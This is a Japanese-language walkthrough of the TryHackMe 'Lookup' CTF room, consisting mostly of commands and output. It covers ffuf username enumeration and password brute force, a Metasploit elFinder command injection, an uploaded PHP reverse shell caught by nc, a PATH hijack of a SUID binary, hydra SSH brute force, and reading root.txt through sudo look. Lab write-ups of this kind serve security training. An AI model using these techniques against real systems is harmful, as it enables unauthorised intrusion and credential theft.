---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: Lookup Walkthrough"
date: 2026-01-08T00:00:00+09:00
aliases: ["/TryHackMe/lookup"]
tags: ["TryHackMe", "CTF", "walkthrough", "elFinder", "ffuf", "SUID", "privilege escalation"]
categories: ["TryHackMe"]
draft: false
cover:
    image: "/images/eyecatch/TryHackMe/lookup/index.webp"
---

# このページでわかること

* TryHackMe ルーム「Lookup」のWalkthrough
* ユーザ名列挙によるログインバイパス
* elFinder の既知脆弱性を利用したリバースシェル取得
* SUID + PATH ハイジャックによる情報漏洩
* `sudo /usr/bin/look` を使った権限昇格

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | Lookup |
| 難易度 | Easy |
| カテゴリ | Web, Privilege Escalation |
| URL | https://tryhackme.com/room/lookup |

# 執筆時の環境

* OS: Ubuntu 20.04 (TryHackMe AttackBox)
* ツール: nmap, ffuf, gobuster, searchsploit, metasploit, hydra, netcat

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/lookup)
* [GTFOBins - look](https://gtfobins.github.io/gtfobins/look/#sudo)
* [revshells.com](https://www.revshells.com/)

---

# 1. ポートスキャン

## 1-1. TCP ポートスキャン

```bash
nmap -sT -P0 $IP
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 1-2. port 22 詳細スキャン

* OS: Ubuntu
* OpenSSH 8.2p1

```bash
nmap -sV -Pn -n --disable-arp-ping --packet-trace -p 22 --reason $IP
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
```

## 1-3. port 22 脆弱性スキャン

```bash
nmap -p 22 --script vuln $IP
```

* 脆弱性は検出されなかった

## 1-4. port 80 詳細スキャン

* OS: Ubuntu
* ミドルウェア: Apache 2.4.41
* `Location: http://lookup.thm` へリダイレクト

```bash
nmap -sV -Pn -n --disable-arp-ping --packet-trace -p 80 --reason $IP
```

## 1-5. port 80 脆弱性スキャン（IPベース）

* CSRF なし / XSS なし
* `/login.php` が存在することを確認

```bash
nmap -p 80 --script vuln $IP
```

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /login.php: Possible admin folder
```

## 1-6. port 80 脆弱性スキャン（ホスト名ベース）

* CSRF あり（`username` フォーム / `login.php`）

```bash
nmap -p 80 --script vuln $HOST
```

```
| http-csrf:
|   Found the following possible CSRF vulnerabilities:
|     Path: http://lookup.thm:80/
|     Form id: username
|_    Form action: login.php
| http-enum:
|_  /login.php: Possible admin folder
```

## 1-7. /etc/hosts に登録

* IPベースの curl ではページが返らない → ホスト名が必要

```bash
echo "$IP $HOST" >> /etc/hosts
curl -H "Host: $HOST" $IP
```

* `login.php` へ遷移するログインページが表示された（username / password の入力フォーム）

---

# 2. 調査

## 2-1. ログインページの動作確認

* `test/test` でログイン試行するとエラーメッセージが返る

```bash
curl "http://$IP/login.php" -H "Host: $HOST" -X POST -d "username=test&password=test"
# -> Wrong username or password. Please try again.

curl "http://$IP/login.php" -H "Host: $HOST" -X POST -d "username=admin&password=test"
# -> Wrong password. Please try again.
```

* **ユーザ名が正しい場合とそうでない場合でメッセージが異なる** → ユーザ名列挙が可能

## 2-2. ffuf でパスワードブルートフォース（admin）

* `-fw 8` でレスポンス単語数が 8（不正解）のものを除外

```bash
ffuf -u http://$IP/login.php -H "Host: $HOST" -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 8 -w /usr/share/wordlists/rockyou.txt | egrep -v ' Errors: '
```

```
password123    [Status: 200, Size: 74, Words: 10, Lines: 1]
```

* しかし `admin/password123` ではログインできなかった

## 2-3. ffuf でユーザ名列挙

* `-fw 10` でレスポンス単語数が 10（Wrong username or password）を除外
* `jose` がマッチ（302 リダイレクト）

```bash
ffuf -u http://$IP/login.php -H "Host: $HOST" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=test" \
  -fw 10 -w /usr/share/wordlists/rockyou.txt | egrep -v ' Errors: '
```

```
jose    [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## 2-4. jose ユーザのパスワードブルートフォース

```bash
ffuf -u http://$IP/login.php -H "Host: $HOST" -X POST \
  -d "username=jose&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 8 -w /usr/share/wordlists/rockyou.txt | egrep -v ' Errors: '
```

```
password123    [Status: 302, Size: 0, Words: 1, Lines: 1]
```

* ログイン成功後、`http://files.lookup.thm` へリダイレクト

```bash
echo "$IP files.$HOST" >> /etc/hosts
```

## 2-5. elFinder のディレクトリ列挙

* タイトルに `elFinder` と表示されるが、ブラウザではコンテンツが見えない
* gobuster で `/elFinder/` 配下を列挙

```bash
gobuster dir -u 'http://files.lookup.thm/elFinder/' \
  -w /usr/share/wordlists/dirb/common.txt -t 200
```

```
/css    (Status: 301)
/files  (Status: 301)
/js     (Status: 301)
/php    (Status: 301)
/sounds (Status: 301)
```

## 2-6. searchsploit で exploit を調査

```bash
searchsploit elfinder
```

```
elFinder 2 - Remote Command Execution (via Fi        | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Inj        | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran'         | php/remote/46539.rb
```

---

# 3. 攻撃 (Exploitation)

## 3-1. Metasploit で elFinder を攻撃

```bash
msfconsole
```

```
msf6> search elfinder
# -> exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection (No.4)

msf6> use 4
msf6> set RHOSTS files.lookup.thm
msf6> run
```

```
[*] Meterpreter session 1 opened (10.65.174.112:4444 -> 10.65.150.169:44452)
```

* `www-data` ユーザで meterpreter セッションが開いた

```
meterpreter > getuid
Server username: www-data
```

## 3-2. リバースシェルをアップロード

* [revshells.com](https://www.revshells.com/) で PHP リバースシェルを生成し `shell.php` として保存

```bash
meterpreter > cd /var/www/files.lookup.thm/public_html/elFinder/php
meterpreter > upload shell.php shell.php
```

* 攻撃クライアント側でポートを待ち受ける

```bash
nc -lnvp 8888
```

* elFinder のブラウザから `shell.php` をクリックして実行 → 接続成功

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty; pty.spawn("bash")'
```

---

# 4. 権限昇格 (Privilege Escalation)

## 4-1. SUID ファイルの調査

```bash
find /usr/ -perm -u=s -type f 2>/dev/null
```

```
/usr/sbin/pwm
```

* `/usr/sbin/pwm` を実行すると `id` コマンドの出力からユーザ名を取得し `$HOME/.passwords` を表示する仕組み

## 4-2. PATH ハイジャックで think ユーザのパスワードを取得

* `/tmp/id` に think ユーザの情報を偽装したスクリプトを作成し、PATH を優先させる

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH

/usr/sbin/pwm
```

* `/home/think/.passwords` の内容がリスト表示された

## 4-3. hydra で think ユーザの SSH パスワードを特定

```bash
hydra -l think -P password-list.txt -t 4 ssh://lookup.thm
```

```
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
```

## 4-4. SSH ログインして user.txt を取得

```bash
ssh think@lookup.thm
# password: josemario.AKA(think)

cat user.txt
```

## 4-5. sudo 権限を確認

```bash
sudo -l
```

```
User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

## 4-6. GTFOBins の look で root.txt を取得

* [GTFOBins - look](https://gtfobins.github.io/gtfobins/look/#sudo) を参考に実行

```bash
LFILE=/root/root.txt
sudo /usr/bin/look '' "$LFILE"
```

---

# 5. フラグ取得

| フラグ | 取得方法 |
|--------|----------|
| user.txt | `think` ユーザで SSH ログイン後に取得 |
| root.txt | `sudo /usr/bin/look` で直接読み取り |
